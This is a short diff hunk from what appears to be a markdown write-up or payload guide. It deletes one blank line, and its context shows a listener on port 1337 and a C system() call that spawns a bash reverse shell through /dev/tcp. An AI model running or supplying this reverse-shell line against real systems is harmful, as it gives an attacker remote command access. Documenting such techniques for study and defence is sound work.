@@ -912,7 +912,6 @@ Listening on 0.0.0.0 1337
 
 ```c
 system('bash -c \'exec bash -i &>/dev/tcp/0/1337 <&1\'')
-
 ```
 
 Result:
